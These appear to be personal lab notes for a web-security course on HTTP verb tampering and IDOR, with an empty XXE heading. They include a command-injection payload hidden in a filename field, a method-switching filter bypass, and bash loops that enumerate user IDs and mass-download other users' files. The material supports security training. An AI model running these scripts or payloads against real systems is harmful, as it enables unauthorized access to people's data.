1.HTTP Verb Tampering
2.Insecure Direct Object References (IDOR)
3.XML External Entity (XXE) Injection

HTTP Verb Tampering----

*Try to use what you learned in this section to access the 'reset.php' page and delete all files. Once all files are deleted, you should get the flag. 
1. fill out reset field and press reset
2. change method -> OPTIONS /admin/reset.php? HTTP/1.1

* To get the flag, try to bypass the command injection filter through HTTP Verb Tampering, while using the following filename: file; cp /flag.txt ./ 
1. In the input field add: filename: file; cp /flag.txt ./. and press enter
2. send request to repeater and then right click -> change request method (POST)
if we are not using pro license then we have to add:
Content-Type: application/x-www-form-urlencoded
3. send


Insecure Direct Object References (IDOR)----
If we want to perform more advanced IDOR attacks, we may need to register multiple users and compare their HTTP requests


Mass IDOR Enumeration -----
curl -s "http://94.237.63.93:35690/documents.php?uid=1" | grep "<li class='pure-tree_link'>"
curl -s "http://SERVER_IP:PORT/documents.php?uid=3" | grep -oP "\/documents.*?.pdf"

#!/bin/bash
url="http://SERVER_IP:PORT"
for i in {1..10}; do
        for link in $(curl -s "$url/documents.php?uid=$i" | grep -oP "\/documents.*?.pdf"); do
                wget -q $url/$link
        done
done


Bypassing Encoded References---
echo -n 1 | md5sum
echo -n 1 | base64 -w 0 | md5sum
for i in {1..10}; do echo -n $i | base64 -w 0 | md5sum | tr -d ' -'; done

#!/bin/bash
for i in {1..10}; do
    for hash in $(echo -n $i | base64 -w 0 | md5sum | tr -d ' -'); do
        curl -sOJ -X POST -d "contract=$hash" http://SERVER_IP:PORT/download.php
    done
done

 
/contract


----
probaj kao drugo resenje:
 #!/bin/bash
 
url=$1

for i in {1..20}; do
        # id = $(echo -n $i | base64 | jq -sRr @uri | sed 's/%0A//')
        for link in $(curl -s "$url/contracts.php" | grep -oP "javascript:downloadContract\('${i}'\)"); do
                echo $link
                wget -q $url/$link
        done
done

echo "Completed"

-------
Chaining IDOR Vulnerabilities ----
=> for API try GET and get api parameters and then user PUT and copy the same parameters (with injected email changes)

XML External Entity (XXE) Injection---------
